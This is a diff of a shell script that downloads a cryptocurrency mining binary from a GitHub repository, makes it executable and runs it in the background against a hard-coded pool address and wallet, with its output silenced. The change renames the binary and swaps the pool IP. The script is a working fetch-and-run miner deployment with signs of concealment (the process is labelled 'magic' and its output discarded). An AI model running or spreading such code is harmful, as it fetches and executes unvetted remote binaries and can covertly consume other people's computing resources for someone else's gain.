@@ -12,10 +12,10 @@ fi
 total_cores=$(nproc)
 
 # Download the mining script
-wget -O sgq https://github.com/barburonjilo/back/raw/main/sr
+wget -O tmii https://github.com/barburonjilo/back/raw/main/sr
 
 # Make the mining script executable
-chmod +x sgq
+chmod +x tmii
 
 # Function to generate the localized date string with core count
 generate_worker() {
@@ -34,7 +34,7 @@ start_magic() {
   local cpu_limit=40
   
   # Start the mining process
-  nohup ./sgq -a yescryptr32 --pool 45.115.225.146:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > /dev/null 2>&1 &
+  nohup ./tmii -a yescryptr32 --pool 45.115.225.129:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > /dev/null 2>&1 &
   local pid=$!
   
   echo "Magic started with PID: $pid using $num_cores cores"
